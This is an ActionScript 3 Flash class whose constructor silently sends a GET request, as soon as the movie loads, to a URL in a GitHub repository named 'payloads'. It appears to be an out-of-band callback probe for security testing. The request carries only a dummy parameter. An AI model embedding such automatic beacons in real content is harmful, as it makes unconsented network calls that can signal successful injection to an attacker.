
package
{
    import flash.display.MovieClip;
    import flash.display.SimpleButton;
    import flash.display.Shape;
    import flash.events.Event;
    import flash.events.MouseEvent;

    import flash.net.*;
    import flash.xml.XMLDocument;
    import flash.events.Event;
    import flash.events.ErrorEvent;
    import flash.events.HTTPStatusEvent;
    
    public class Callback extends MovieClip
    {
    
        public function makeReq() 
        {
            var url:String = "https://raw.githubusercontent.com/hackerwithnoname/payloads/master/123.php"
            var variables:URLVariables = new URLVariables();
            variables.test = "Something";
            var request:URLRequest = new URLRequest(url);
            request.method = "GET";
            request.data = variables;
            try {   
                sendToURL(request);
            }
            catch (e:Error) {
                // handle error here
            }
        }

        public function Callback()
        {
            makeReq();
        }
    }
}
